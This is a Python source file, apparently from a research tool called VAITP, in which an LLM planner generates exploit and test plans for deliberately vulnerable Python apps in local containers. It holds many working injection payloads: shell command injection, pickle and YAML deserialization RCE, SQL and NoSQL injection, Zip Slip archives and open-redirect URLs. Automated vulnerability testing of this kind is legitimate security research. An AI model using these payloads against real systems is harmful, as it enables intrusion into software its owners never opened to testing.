"""
VAITP Phase 3: Planner Agent
The "Brain" that uses an LLM to generate SEP and AEP plans.
Uses RAG-enhanced prompting with Gold Standard examples as few-shot context.
"""
import json
import logging
import re
from typing import Optional, Dict, Any, Tuple

from structures import SEP, CEP, AEP, FEP, PlannerFeedback

logger = logging.getLogger(__name__)


# ==========================================
# GOLD STANDARD EXAMPLES (Few-Shot Context)
# ==========================================
GOLD_STANDARD_EXAMPLES = [
    {
        "vuln_type": "OS Command Injection (subprocess, shell=True)",
        "sep": {"target_id": "CWE-78", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": [], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "stdio",
                "exploit_rationale": "The app passes user input to subprocess with shell=True. The semicolon breaks out of the intended command context, allowing 'touch /tmp/pwned' to execute as a separate shell command."},
        "aep": {"tries": [{"input": "ignored; touch /tmp/pwned", "response": None}]},
        "fep": {"tries": [{"input": "main_vuln.py", "response": "main_vuln.py"}]},
    },
    {
        "vuln_type": "GitPython Remote Code Execution (ext:: protocol)",
        "sep": {"target_id": "CVE-2022-24439", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["git", "pip:gitpython==3.1.29"],
                "setup_commands": ["git config --system protocol.ext.allow always",
                                   "git config --global protocol.ext.allow always"], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "stdio",
                "exploit_rationale": "GitPython passes the user-supplied URL to git clone without sanitization. The 'ext::' protocol handler tells git to execute the remainder as a shell command."},
        "aep": {"tries": [{"input": "ext::touch /tmp/pwned", "response": None}]},
        "fep": {"tries": [{"input": "/tmp/fake_repo\\n", "response": "URL"}]},
    },
    {
        "vuln_type": "YAML Deserialization (yaml.load with Loader=yaml.Loader)",
        "sep": {"target_id": "CWE-502-YAML", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:PyYAML"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "stdio",
                "exploit_rationale": "The app uses yaml.load() with an unsafe Loader. The !!python/object/apply tag calls os.system() during deserialization."},
        "aep": {"tries": [{"input": "!!python/object/apply:os.system [\"touch /tmp/pwned\"]", "response": None}]},
        "fep": {"tries": [{"input": "key: value\\n", "response": "Config"}]},
    },
    {
        "vuln_type": "SQL Injection (executescript with f-string)",
        "sep": {"target_id": "CWE-89", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": [], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "stdio",
                "exploit_rationale": "The app interpolates user input into SQL via f-string. ATTACH DATABASE creates a new file at /tmp/pwned as a SQLite side-effect."},
        "aep": {"tries": [{"input": "admin'; ATTACH DATABASE '/tmp/pwned' AS pwn; --", "response": None}]},
        "fep": {"tries": [{"input": "admin\\n", "response": "User"}]},
    },
    {
        "vuln_type": "Flask SQL Injection via GET parameter (string concatenation)",
        "sep": {"target_id": "CWE-89-FLASK", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_sqli", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/user?username=", "http_method": "GET",
                "exploit_rationale": "The Flask app concatenates the username GET parameter directly into a SQL query string. "
                    "The ATTACH DATABASE payload creates a new SQLite file at /tmp/pwned_sqli as a direct side-effect of the injection. "
                    "For apps using cursor.execute() (single-statement), the tautology payload triggers the auto-injected monkey-patch "
                    "which detects the injection markers in the SQL string."},
        "aep": {"tries": [
            {"input": "'; ATTACH DATABASE '/tmp/pwned_sqli' AS pwn; --", "response": None},
            {"input": "' OR '1'='1", "response": None},
            {"input": "admin' UNION SELECT 1,2,3--", "response": None},
        ]},
        "fep": {"tries": [{"input": "admin", "response": "User found"}]},
    },
    {
        "vuln_type": "Flask SQL Injection via POST JSON body with MySQL (f-string in INSERT, CWE-89)",
        "sep": {"target_id": "CWE-89-MYSQL-POST", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "pip:flask-mysqldb", "curl", "procps"],
                "setup_commands": [
                    "apt-get update -qq && apt-get install -y -qq default-mysql-client",
                    "sleep 15",
                    "mysql -h mysql -u root -proot -e \"CREATE DATABASE IF NOT EXISTS testdb;\"",
                    "mysql -h mysql -u root -proot testdb -e \"CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(512), password VARCHAR(512));\""
                ],
                "services": [{"image": "mysql:8.0", "alias": "mysql",
                              "environment": {"MYSQL_ROOT_PASSWORD": "root"}}]},
        "cep": {"success_file": "/tmp/pwned_mysql_sqli", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/register", "http_method": "POST",
                "json_template": "{\"username\": %s, \"password\": \"test\"}",
                "exploit_rationale": "The Flask app uses an f-string to build an INSERT query with the username "
                    "field from JSON POST body. The tautology payload injects SQL metacharacters that the "
                    "auto-injected MySQL monkey-patch detects, creating the success file. "
                    "IMPORTANT: json_template uses %s (no quotes) as placeholder. AEP input is the payload "
                    "wrapped in double quotes, e.g. \"' OR '1'='1\"."},
        "aep": {"tries": [
            {"input": "\"' OR '1'='1\"", "response": None},
            {"input": "\"' OR 1=1-- \"", "response": None},
        ]},
        "fep": {"tries": [{"input": "\"admin\"", "response": "registered"}]},
    },
    {
        "vuln_type": "Eval Injection (eval() on user input)",
        "sep": {"target_id": "CWE-95", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": [], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "stdio",
                "exploit_rationale": "The app passes user input directly to eval(). __import__('os').system() executes a shell command within the eval context."},
        "aep": {"tries": [{"input": "__import__('os').system('touch /tmp/pwned')", "response": None}]},
        "fep": {"tries": [{"input": "4\\n", "response": "Result: 4"}]},
    },
    {
        "vuln_type": "Flask RCE via GET parameter (os.system)",
        "sep": {"target_id": "CWE-78-FLASK", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/health?check=ignored", "http_method": "GET",
                "exploit_rationale": "The Flask app passes a GET query parameter to os.system(). The semicolon terminates the intended command and appends a touch command."},
        "aep": {"tries": [{"input": "; touch /tmp/pwned", "response": None}]},
        "fep": {"tries": [{"input": "OK", "response": "Check"}]},
    },
    {
        "vuln_type": "Flask JSON POST RCE (os.system on JSON field)",
        "sep": {"target_id": "CWE-78-JSON", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/api/ping", "http_method": "POST",
                "json_template": "{\"domain\": \"netpack.pt%s\"}",
                "exploit_rationale": "The Flask app extracts a JSON field and passes it to os.system() in a ping command. The semicolon breaks out of the ping context."},
        "aep": {"tries": [{"input": "; touch /tmp/pwned", "response": None}]},
        "fep": {"tries": [{"input": "127.0.0.1", "response": ":"}]},
    },
    {
        "vuln_type": "Flask Direct Command Execution via JSON POST (subprocess.run(input, shell=True))",
        "sep": {"target_id": "CWE-78-DIRECT", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_direct", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/api/whois", "http_method": "POST",
                "json_template": "{\"domain\": \"%s\"}",
                "exploit_rationale": "The Flask app passes the JSON 'domain' field DIRECTLY to subprocess.run() with shell=True. "
                    "The user input IS the entire shell command — no prefix, no interpolation. "
                    "The payload 'touch /tmp/pwned_direct' becomes the complete shell command."},
        "aep": {"tries": [
            {"input": "touch /tmp/pwned_direct", "response": None},
            {"input": "/bin/touch /tmp/pwned_direct", "response": None},
        ]},
        "fep": {"tries": [{"input": "echo hello", "response": "executed"}]},
    },
    {
        "vuln_type": "NoSQL Injection with MongoDB sidecar",
        "sep": {"target_id": "CWE-943-MONGO-REAL", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "pip:pymongo", "curl", "procps"], "setup_commands": [],
                "services": [{"image": "mongo:4.4", "alias": "mongodb"}]},
        "cep": {"success_file": "/tmp/pwned", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/login", "http_method": "POST",
                "json_template": "{\"u\": \"admin\", \"p\": %s}",
                "exploit_rationale": "The Flask app passes unsanitized JSON to MongoDB's find_one(). The {\"$ne\": \"\"} operator bypasses authentication."},
        "aep": {"tries": [{"input": "{\"$ne\": \"\"}", "response": None}]},
        "fep": {"tries": [{"input": "\"wrong_password\"", "response": "invalid"}]},
    },
    {
        "vuln_type": "Pickle Deserialization via generator script (CWE-502)",
        "sep": {"target_id": "CWE-502-PICKLE", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": [], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_pickle", "strategy": "stdio",
                "exploit_rationale": "The app deserializes user-supplied hex with pickle.loads(). A generator script builds the pickle payload at runtime using the __reduce__ protocol to call os.system()."},
        "aep": {"tries": [
            {"generator": "import pickle, os\nclass E:\n    def __reduce__(self):\n        return (os.system, ('touch /tmp/pwned_pickle',))\nprint(pickle.dumps(E(), protocol=3).hex())", "response": None},
        ]},
        "fep": {"tries": [{"input": "80037d710058030000006b65797101580500000076616c75657102732e\n", "response": "Settings"}]},
    },
    {
        "vuln_type": "Zip Slip path traversal via craft_file (CWE-22)",
        "sep": {"target_id": "CWE-22-ZIPSLIP", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": [], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_zip", "strategy": "stdio",
                "exploit_rationale": "The app extracts a tar archive without validating member paths. A crafted tar with ../../ traversal entries escapes the target directory. The craft_file generator builds the tar at runtime."},
        "aep": {"tries": [
            {"craft_file": {"path": "/app/evil.tar", "generator": "import tarfile, io, sys, base64\nbuf = io.BytesIO()\nwith tarfile.open(fileobj=buf, mode='w') as t:\n    content = b'VULN_CONFIRMED'\n    info = tarfile.TarInfo(name='../../../../../../tmp/pwned_zip')\n    info.size = len(content)\n    t.addfile(info, io.BytesIO(content))\nsys.stdout.buffer.write(buf.getvalue())"}, "input": "/app/evil.tar", "response": None},
        ]},
        "fep": {"tries": [{"input": "UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==", "response": "Archive:"}]},
    },
    {
        "vuln_type": "Open Redirect with side-effect instrumentation (CWE-601)",
        "sep": {"target_id": "CWE-601", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_open_redirect", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/redirecting?url=", "http_method": "GET",
                "exploit_rationale": "The vulnerable Flask app passes the 'url' query parameter directly to "
                    "flask.redirect() without validation. When an external URL is supplied (not starting with '/'), "
                    "the app creates /tmp/pwned_open_redirect as a side-effect before redirecting. "
                    "The patched version checks url.startswith('/') and returns 400 for external URLs."},
        "aep": {"tries": [
            {"input": "https://evil.com", "response": None},
            {"input": "http://attacker.example.org/phish", "response": None},
        ]},
        "fep": {"tries": [{"input": "/safe", "response": "Redirecting"}]},
    },
    {
        "vuln_type": "Flask Header Injection RCE (os.system on HTTP header value, CWE-78)",
        "sep": {"target_id": "CWE-78-HEADER", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_header", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/tracking", "http_method": "GET",
                "http_headers": {"Referer": "PAYLOAD_PLACEHOLDER"},
                "exploit_rationale": "The Flask app reads the Referer header via request.headers.get('Referer') "
                    "and passes it to os.system() for logging. The shell metacharacter ';' breaks out of the "
                    "intended command and executes 'touch /tmp/pwned_header' as a separate command."},
        "aep": {"tries": [
            {"input": "'; touch /tmp/pwned_header; echo '", "response": None},
            {"input": "x$(touch /tmp/pwned_header)", "response": None},
            {"input": "x`touch /tmp/pwned_header`", "response": None},
        ]},
        "fep": {"tries": [{"input": "https://example.com", "response": "Logged"}]},
    },
    {
        "vuln_type": "Flask Cookie Pickle Deserialization RCE (base64-encoded cookie, CWE-502)",
        "sep": {"target_id": "CWE-502-COOKIE", "image": "python:3.9-slim", "working_dir": "/app",
                "dependencies": ["pip:flask", "curl", "procps"], "setup_commands": [], "services": []},
        "cep": {"success_file": "/tmp/pwned_cookie", "strategy": "network",
                "target_url": "http://127.0.0.1:5000/", "http_method": "GET",
                "http_headers": {"Cookie": "auth=PAYLOAD_PLACEHOLDER"},
                "exploit_rationale": "The Flask app reads a cookie, base64-decodes it, and passes it to "
                    "pickle.loads(). A generator script builds the RCE payload at runtime "
                    "and base64-encodes it. The cookie is delivered via the Cookie HTTP header, NOT as "
                    "a GET query parameter. IMPORTANT: request.cookies.get('name') reads from the Cookie "
                    "header, so use http_headers: {Cookie: 'name=PAYLOAD_PLACEHOLDER'}. "
                    "CRITICAL: If the code does DOUBLE base64 decode (b64decode called twice), the "
                    "generator must double-encode: inner=b64encode(pickle), outer=b64encode(inner)."},
        "aep": {"tries": [
            {"generator": "import pickle, os, base64\nclass E:\n    def __reduce__(self):\n        return (os.system, ('touch /tmp/pwned_cookie',))\npayload = pickle.dumps(E(), protocol=2)\ninner = base64.b64encode(payload).decode()\nouter = base64.b64encode(inner.encode()).decode()\nprint(outer)", "response": None},
        ]},
        "fep": {"tries": [{"input": "eyJ1c2VyIjogImd1ZXN0In0=", "response": "Welcome"}]},
    },
]


def analyze_code_for_plan_hints(vuln_code: str, patch_code: str = "") -> str:
    """
    Deep static analysis of vulnerable code to extract plan-generation hints.

    Returns a structured text block that the LLM planner can use to generate
    more accurate SEP/CEP/AEP/FEP plans. Analyzes:
      - Shell quoting context (single-quotes, double-quotes, backticks)
      - Output format (what the code actually prints for benign input)
      - Vulnerability sink (exact function call and how input reaches it)
      - Input vector (stdin, request.args, request.form, request.json, headers)
      - Whether the code is ACTUALLY vulnerable (false positive detection)
      - SQL execution method (execute vs executescript — affects ATTACH DATABASE)
      - Deserialization method (pickle.loads vs json.loads vs eval)
    """
    hints = []
    code_lower = vuln_code.lower()

    try:
        import ast
        tree = ast.parse(vuln_code)
    except SyntaxError:
        hints.append("WARNING: Code has syntax errors — may not run at all.")
        return "\n".join(hints)

    # --- Detect input vector ---
    if "input(" in vuln_code:
        hints.append("INPUT_VECTOR: stdin (input() function). Strategy should be 'stdio'.")
    elif "sys.stdin" in vuln_code:
        hints.append("INPUT_VECTOR: stdin (sys.stdin). Strategy should be 'stdio'.")
    if "request.args" in vuln_code:
        import re
        params = re.findall(r"request\.args\.get\(\s*['\"]([^'\"]+)['\"]", vuln_code)
        if params:
            hints.append(f"INPUT_VECTOR: GET query parameter(s): {', '.join(params)}. Strategy should be 'network'.")
    if "request.form" in vuln_code:
        hints.append("INPUT_VECTOR: POST form data. Strategy should be 'network'.")
    if "request.get_json" in vuln_code or "request.json" in vuln_code:
        import re
        # Extract fields accessed on the JSON data object (data['field'] or data.get('field'))
        # First find the variable name assigned from get_json()/request.json
        json_vars = re.findall(r"(\w+)\s*=\s*request\.(?:get_json\(\)|json)\b", vuln_code)
        fields = []
        for jv in json_vars:
            # Match data['field'] or data["field"]
            fields += re.findall(rf"{re.escape(jv)}\s*\[\s*['\"]([^'\"]+)['\"]", vuln_code)
            # Match data.get('field')
            fields += re.findall(rf"{re.escape(jv)}\.get\(\s*['\"]([^'\"]+)['\"]", vuln_code)
        # Deduplicate while preserving order
        seen = set()
        unique_fields = []
        for f in fields:
            if f not in seen:
                seen.add(f)
                unique_fields.append(f)
        hints.append(f"INPUT_VECTOR: JSON POST body. Fields: {', '.join(unique_fields) if unique_fields else 'unknown'}. Strategy should be 'network'. http_method must be POST.")
    if "request.headers" in vuln_code:
        import re
        headers = re.findall(r"request\.headers\.get\(\s*['\"]([^'\"]+)['\"]", vuln_code)
        if headers:
            hints.append(f"INPUT_VECTOR: HTTP header(s): {', '.join(headers)}. Use http_headers with PAYLOAD_PLACEHOLDER.")
    if "request.cookies" in vuln_code:
        import re
        cookies = re.findall(r"request\.cookies\.get\(\s*['\"]([^'\"]+)['\"]", vuln_code)
        if cookies:
            hints.append(
                f"INPUT_VECTOR: HTTP cookie(s): {', '.join(cookies)}. Strategy should be 'network'. "
                f"Use http_headers with Cookie header: {{{', '.join(c + '=PAYLOAD_PLACEHOLDER' for c in cookies)}}}"
            )

    # --- Detect Flask routes ---
    if "flask" in code_lower:
        import re
        routes = re.findall(r"@\w+\.route\(\s*['\"]([^'\"]+)['\"]", vuln_code)
        methods = re.findall(r"methods\s*=\s*\[([^\]]+)\]", vuln_code)
        if routes:
            hints.append(f"FLASK_ROUTES: {', '.join(routes)}")
        if methods:
            hints.append(f"HTTP_METHODS: {', '.join(methods)}")
        if "host='0.0.0.0'" not in vuln_code and "host=\"0.0.0.0\"" not in vuln_code:
            hints.append("NOTE: Flask app binds to 127.0.0.1 (default). This is fine — curl runs inside the same container.")

    # --- Detect shell quoting context for command injection ---
    import re
    # Match f-string shell commands: subprocess.run(f"echo 'Status: {service}'", shell=True)
    # or os.system(f"echo '{user_input}'")
    for line in vuln_code.split('\n'):
        stripped = line.strip()
        # Look for shell=True or os.system with f-string
        is_shell_cmd = (
            ("shell=True" in stripped or "os.system" in stripped or "os.popen" in stripped)
            and re.search(r'f["\']', stripped)
            and "{" in stripped
        )
        if is_shell_cmd:
            # Extract the f-string content — match the correct closing quote
            fstr_match = re.search(r'f"([^"]*)"', stripped) or re.search(r"f'([^']*)'", stripped)
            if fstr_match:
                fstr_content = fstr_match.group(1)
                # Check quoting context around the interpolated variable
                for var_match in re.finditer(r"'[^']*\{(\w+)\}[^']*'", fstr_content):
                    var_name = var_match.group(1)
                    hints.append(
                        f"SHELL_CONTEXT: User input '{var_name}' is inside SINGLE QUOTES in shell command. "
                        f"Pattern: {fstr_content[:80]}. "
                        "Payload must break out of single-quote context: x'; touch /tmp/pwned; echo 'x"
                    )
                for var_match in re.finditer(r'"[^"]*\{(\w+)\}[^"]*"', fstr_content):
                    var_name = var_match.group(1)
                    hints.append(
                        f"SHELL_CONTEXT: User input '{var_name}' is inside DOUBLE QUOTES in shell command. "
                        f"Pattern: {fstr_content[:80]}. "
                        'Payload must break out of double-quote context: x"; touch /tmp/pwned; echo "x'
                    )
                # Check for unquoted interpolation (not inside any quotes)
                for var_match in re.finditer(r'\{(\w+)\}', fstr_content):
                    var_name = var_match.group(1)
                    pos = var_match.start()
                    before = fstr_content[:pos]
                    # Count unescaped quotes before this position
                    single_q = before.count("'")
                    double_q = before.count('"')
                    if single_q % 2 == 0 and double_q % 2 == 0:
                        hints.append(
                            f"SHELL_CONTEXT: User input '{var_name}' is UNQUOTED in shell command. "
                            f"Pattern: {fstr_content[:80]}. "
                            "Simple payload works: ; touch /tmp/pwned"
                        )

    # --- Detect when user input IS the entire shell command ---
    # Pattern: subprocess.run(variable, shell=True) where variable comes from user input.
    # The payload doesn't need shell metacharacters — the entire input IS the command.
    for line in vuln_code.split('\n'):
        stripped = line.strip()
        if 'shell=True' in stripped:
            # Match subprocess.run(varname, ...) or subprocess.call(varname, ...)
            var_match = re.search(
                r'subprocess\.(?:run|call|check_call|check_output|Popen)\(\s*(\w+)\s*,',
                stripped
            )
            if var_match:
                var_name = var_match.group(1)
                # Check it's not a string literal or list
                if var_name not in ('True', 'False', 'None') and not var_name.startswith('"') and not var_name.startswith("'"):
                    hints.append(
                        f"DIRECT_COMMAND: User input variable '{var_name}' is passed DIRECTLY as the "
                        f"entire shell command (subprocess with shell=True). The payload IS the command — "
                        f"no need for shell metacharacters like ';'. "
                        f"Payload: 'touch /tmp/pwned' (the whole input becomes the shell command). "
                        f"json_template should use \"%s\" not \"prefix%s\" — the payload must be the "
                        f"complete value, not appended to something."
                    )

    # --- Detect if subprocess uses list form (NOT vulnerable) ---
    if re.search(r"subprocess\.\w+\(\s*\[", vuln_code):
        if "shell=True" not in vuln_code:
            hints.append(
                "FALSE_POSITIVE: subprocess uses list form without shell=True — "
                "this is NOT vulnerable to command injection. The code is safe."
            )

    # --- Detect hardcoded commands (input ignored) ---
    # Look for os.system() or subprocess calls where the command string is NOT an f-string
    # and contains no format specifiers — meaning user input is never injected.
    for line in vuln_code.split('\n'):
        stripped = line.strip()
        # Match: os.system("...") or subprocess.run("...") WITHOUT f-prefix
        if re.match(r'.*(?:os\.system|subprocess\.(?:run|call|check_output|Popen))\s*\(\s*["\']', stripped):
            # Check it's NOT an f-string
            if not re.match(r'.*(?:os\.system|subprocess\.(?:run|call|check_output|Popen))\s*\(\s*f["\']', stripped):
                # Extract the command string
                cmd_match = re.search(r'(?:os\.system|subprocess\.\w+)\s*\(\s*["\']([^"\']*)["\']', stripped)
                if cmd_match:
                    cmd = cmd_match.group(1)
                    if "{" not in cmd and "%" not in cmd:
                        hints.append(
                            f"FALSE_POSITIVE: Command is hardcoded ('{cmd[:60]}'), user input is NOT injected. "
                            "This code is NOT vulnerable to command injection."
                        )

    # Detect when user input is read but never used in the dangerous sink.
    # E.g., domain = data.get('domain') is read but the subprocess call uses a
    # hardcoded command string that doesn't reference 'domain'.
    if "flask" in code_lower:
        # Find all user-input variables
        input_vars = set()
        for m in re.finditer(r"(\w+)\s*=\s*(?:request\.(?:args|form|json)\.get|data\.get)\s*\(\s*['\"]", vuln_code):
            input_vars.add(m.group(1))
        # Find all dangerous sink calls
        for m in re.finditer(r"(?:os\.system|subprocess\.\w+)\s*\((.+?)(?:\)|$)", vuln_code, re.MULTILINE):
            sink_arg = m.group(1)
            # Check if any input variable appears in the sink argument
            used_vars = [v for v in input_vars if v in sink_arg]
            if input_vars and not used_vars:
                hints.append(
                    f"FALSE_POSITIVE: User input variables ({', '.join(input_vars)}) are read but "
                    f"NEVER passed to the dangerous sink. The command is hardcoded. "
                    "This code is NOT vulnerable to command injection via user input."
                )

    # --- Detect SQL execution method ---
    if "executescript" in vuln_code:
        hints.append(
            "SQL_METHOD: Uses executescript() — supports multiple statements. "
            "ATTACH DATABASE payload will create the file directly as a SQLite side-effect."
        )
    elif "execute(" in vuln_code and ("sqlite3" in code_lower or "cursor" in code_lower or "mysql" in code_lower):
        hints.append(
            "SQL_METHOD: Uses cursor.execute() — single statement only. "
            "ATTACH DATABASE payload will FAIL because execute() rejects multi-statement SQL. "
            "Use tautology payloads like: ' OR '1'='1 or ' OR 1=1-- "
            "The auto-injected monkey-patch detects injection markers in the SQL query string "
            "and creates the success file when markers like ' OR, ' AND, UNION, --, etc. are found. "
            "IMPORTANT FOR POST+JSON: json_template MUST have a %s placeholder for the injectable field. "
            "Example: {\"username\": %s, \"password\": \"test\"}. "
            "AEP input should be JUST the raw payload string (e.g. \"' OR '1'='1\") — "
            "it will be automatically JSON-encoded and substituted into the template. "
            "Do NOT put the full JSON body as the AEP input. Do NOT pre-quote the payload."
        )

    # --- Detect database service requirements ---
    if "flask_mysqldb" in vuln_code or "MySQLdb" in vuln_code or "mysqlclient" in vuln_code:
        hints.append(
            "DATABASE: Code uses MySQL (flask_mysqldb/MySQLdb). "
            "SEP must include a MySQL service: {\"image\": \"mysql:8.0\", \"alias\": \"mysql\"} "
            "and set environment variables: MYSQL_HOST=mysql, MYSQL_USER=root, MYSQL_PASSWORD=root, MYSQL_DB=testdb. "
            "Also add setup_commands to create the database and table before the app starts."
        )
    elif "pymongo" in vuln_code or "MongoClient" in vuln_code:
        hints.append(
            "DATABASE: Code uses MongoDB. "
            "SEP must include a MongoDB service: {\"image\": \"mongo:4.4\", \"alias\": \"mongodb\"}."
        )
    elif "psycopg2" in vuln_code:
        hints.append(
            "DATABASE: Code uses PostgreSQL. "
            "SEP must include a PostgreSQL service: {\"image\": \"postgres:13\", \"alias\": \"postgres\"}."
        )
        # Check if input is quoted in the SQL
        sql_patterns = re.findall(r"(?:execute|executescript)\s*\(\s*f?['\"](.+?)['\"]", vuln_code, re.DOTALL)
        for sql in sql_patterns:
            if "'{" in sql or "\"{" in sql:
                hints.append("SQL_QUOTING: Input is quoted in SQL string. Payload must close the quote first: x' OR '1'='1")
            elif "{" in sql:
                hints.append("SQL_QUOTING: Input is NOT quoted in SQL string. Payload needs its own quotes: 'x' OR '1'='1'")

    # --- Detect deserialization method ---
    if "pickle.loads" in vuln_code:
        hints.append(
            "DESER_METHOD: Uses pickle.loads() — vulnerable to RCE via __reduce__. "
            "Use a generator script to build the pickle payload with os.system('touch /tmp/pwned')."
        )
        # Detect hex-encoding wrapper (common pattern: bytes.fromhex → pickle.loads)
        if "fromhex" in vuln_code or "bytes.fromhex" in vuln_code:
            hints.append(
                "DESER_ENCODING: Input is hex-decoded before pickle.loads(). "
                "Both AEP and FEP inputs must be hex-encoded. "
                "AEP: hex-encode the pickle RCE payload. "
                "FEP: hex-encode a simple pickled dict, e.g. use a generator: "
                "python3 -c \"import pickle; print(pickle.dumps({'key':'value'}).hex())\""
            )
        # Detect base64-encoding wrapper (common pattern: base64.b64decode → pickle.loads)
        if "b64decode" in vuln_code or "base64.b64decode" in vuln_code or "decodebytes" in vuln_code:
            b64_count = vuln_code.count("b64decode") + vuln_code.count("decodebytes")
            if b64_count >= 2:
                hints.append(
                    "DESER_ENCODING: Input is DOUBLE base64-decoded before pickle.loads(). "
                    "The cookie value is decoded twice: first to get an intermediate string, "
                    "then that string is decoded again to get the raw pickle bytes. "
                    "AEP generator MUST double-base64-encode: "
                    "inner = base64.b64encode(pickle_bytes).decode(); "
                    "outer = base64.b64encode(inner.encode()).decode(); print(outer). "
                    "FEP: double-base64-encode a simple pickled dict."
                )
            else:
                hints.append(
                    "DESER_ENCODING: Input is base64-decoded before pickle.loads(). "
                    "Both AEP and FEP inputs must be base64-encoded. "
                    "AEP generator MUST import base64 and output base64.b64encode(payload).decode(). "
                    "FEP: base64-encode a simple pickled dict or JSON object, e.g.:\n"
                    "  python3 -c \"import base64,json; print(base64.b64encode(json.dumps({'user':'guest'}).encode()).decode())\""
                )
        # Detect cookie input — payload goes in Cookie header, NOT query params
        if "request.cookies" in vuln_code:
            cookie_names = re.findall(r"request\.cookies\.get\(\s*['\"]([^'\"]+)['\"]", vuln_code)
            if cookie_names:
                # Detect double base64 decode pattern:
                # json_data = base64.b64decode(token); pickle.loads(base64.b64decode(json_data))
                b64_count = vuln_code.count("b64decode") + vuln_code.count("base64.b64decode")
                double_b64 = b64_count >= 2
                if double_b64:
                    hints.append(
                        f"COOKIE_DELIVERY: The pickle input comes from request.cookies.get('{cookie_names[0]}'). "
                        f"CRITICAL: The code does DOUBLE base64 decode — the cookie value is base64-decoded TWICE "
                        f"before being passed to pickle.loads(). The generator MUST double-base64-encode the payload: "
                        f"inner = base64.b64encode(pickle_bytes).decode(); outer = base64.b64encode(inner.encode()).decode(). "
                        f"Use http_headers: {{\"Cookie\": \"{cookie_names[0]}=PAYLOAD_PLACEHOLDER\"}}."
                    )
                else:
                    hints.append(
                        f"COOKIE_DELIVERY: The pickle input comes from request.cookies.get('{cookie_names[0]}'). "
                        f"The payload MUST be sent via the Cookie HTTP header: "
                        f"http_headers: {{\"Cookie\": \"{cookie_names[0]}=PAYLOAD_PLACEHOLDER\"}}. "
                        f"Do NOT put the payload in the URL query string — request.cookies reads from "
                        f"the Cookie header, not from URL parameters."
                    )
    elif "json.loads" in vuln_code and "pickle" not in code_lower and "eval(" not in vuln_code:
        hints.append(
            "FALSE_POSITIVE: Uses json.loads() NOT pickle.loads() — "
            "this is NOT vulnerable to deserialization RCE. JSON is safe."
        )
    elif "eval(" in vuln_code:
        # Check if eval is called on user input
        eval_calls = re.findall(r"eval\s*\(\s*(\w+)", vuln_code)
        hints.append(
            f"EVAL_SINK: eval() called on: {', '.join(eval_calls)}. "
            "Payload: __import__('os').system('touch /tmp/pwned')"
        )
        # Detect json.loads → eval chain (e.g. cookie-based eval injection)
        # Pattern: data = json.loads(decoded); ... eval(data)
        if "json.loads" in vuln_code:
            # Detect encoding wrapper (base64, hex, etc.)
            encoding = "raw"
            if "base64" in vuln_code and ("b64decode" in vuln_code or "decodebytes" in vuln_code):
                encoding = "base64"
            elif "fromhex" in vuln_code:
                encoding = "hex"
            hints.append(
                f"EVAL_CHAIN: json.loads() → eval() chain detected. "
                f"The code parses JSON first, then eval()s the result. "
                f"To exploit: the JSON input must be a JSON STRING (with outer quotes) "
                f"containing a Python expression. Example JSON payload:\n"
                f'  "\\\"__import__(\'os\').system(\'touch /tmp/pwned\')\\\""\n'
                f"This is a JSON string whose value is a Python expression. "
                f"json.loads() returns the string, then eval() executes it.\n"
                f"Input encoding: {encoding}. "
                + (f"The payload must be base64-encoded before sending.\n" if encoding == "base64" else "")
                + f"For FEP (benign input): use a JSON string with a simple Python literal, "
                f'e.g. "\\\"42\\\"" (JSON string containing "42"). '
                f"json.loads returns '42', eval('42') returns 42. "
                f"The patched code (no eval) returns the string directly — both produce output containing '42'."
            )

    # --- Detect YAML loader safety ---
    if "yaml" in code_lower:
        if "FullLoader" in vuln_code or "SafeLoader" in vuln_code:
            hints.append(
                "FALSE_POSITIVE: Uses yaml.FullLoader or SafeLoader — "
                "!!python/object/apply is BLOCKED. This is NOT vulnerable to YAML deserialization RCE."
            )
        elif "Loader=yaml.Loader" in vuln_code or "yaml.unsafe_load" in vuln_code or "yaml.load(" in vuln_code:
            if "Loader" not in vuln_code or "Loader=yaml.Loader" in vuln_code:
                hints.append("YAML_LOADER: Uses unsafe yaml.load() — vulnerable to !!python/object/apply.")

    # --- Detect output format for FEP ---
